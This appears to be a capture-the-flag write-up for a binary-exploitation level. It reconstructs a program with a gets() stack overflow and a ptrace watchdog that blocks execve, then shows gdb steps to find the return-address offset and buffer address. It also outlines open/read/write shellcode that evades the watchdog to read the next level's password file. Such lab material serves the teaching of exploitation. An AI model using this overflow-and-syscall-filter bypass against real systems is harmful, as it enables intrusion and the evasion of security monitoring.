# Level04

## Reconstructed source

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <sys/ptrace.h>
#include <sys/prctl.h>
#include <sys/wait.h>

int main(void)
{
    char buffer[128];
    int  status;
    int  pid;

    pid = fork();
    if (pid == 0)
    {
        // child: reads our input
        prctl(PR_SET_PDEATHSIG, SIGHUP);
        ptrace(PTRACE_TRACEME, 0, 0, 0);
        puts("Give me some shellcode, k");
        gets(buffer);
    }
    else
    {
        // parent: traces the child, kills it if it calls execve
        while (1)
        {
            wait(&status);
            if (WIFEXITED(status) || WIFSIGNALED(status))
            {
                puts("child is exiting...");
                break;
            }
            if (ptrace(PTRACE_PEEKUSER, pid, 0x2c, 0) == 11)   // 11 = execve
            {
                puts("no exec() for you");
                kill(pid, SIGKILL);
                break;
            }
        }
    }
    return (0);
}
```

(The binary also contains the helpers `get_unum` and `clear_stdin`, but `main`
does not call them.)

## Vulnerability

Two things combine:

1. **Stack buffer overflow** - the child reads input with `gets(buffer)`, which
   is unbounded, into a 128-byte stack buffer. We overwrite the saved return
   address of `main`. The stack is executable (`GNU_STACK ... RWE`, NX disabled),
   so we can jump to shellcode placed in the overflowed buffer.

2. **Anti-exec watchdog** - the parent traces the child via `ptrace`. On every
   trap it reads the child's syscall number (`PTRACE_PEEKUSER` at offset `0x2c`,
   i.e. `orig_eax`); if the child ever calls `execve` (syscall `11`) it prints
   `no exec() for you` and kills it.

So a classic `execve("/bin/sh")` shellcode is detected and killed. The way around
it is shellcode that **never calls execve**: open/read/write the next password
file directly. The parent only watches for syscall 11, so `open` (5), `read` (3)
and `write` (4) all run freely.

## Exploitation

### Step 1 - offset to the return address

A cyclic pattern finds the offset (debug the child with `follow-fork-mode child`;
`ptrace(TRACEME)` fails harmlessly under gdb):

```sh
gdb ./level04
(gdb) set follow-fork-mode child
(gdb) run < /tmp/p4
# Program received signal SIGSEGV
(gdb) info registers eip        # eip = 0x4141416e  -> offset 156
```

### Step 2 - address of the buffer

```sh
(gdb) break *0x804875e          # the `call gets` instruction
(gdb) run < /tmp/p4
(gdb) info registers eax        # eax = 0xffffd670  -> &buffer
```

### Step 3 - open/read/write shellcode

The shellcode runs entirely in the traced child (no execve, so the watchdog
never fires):

```
open("/home/users/level05/.pass", O_RDONLY)   // syscall 5
read(fd, buffer, 200)                          // syscall 3
write(1, buffer, n)                            // syscall 4
exit(0)                                        // syscall 1
```

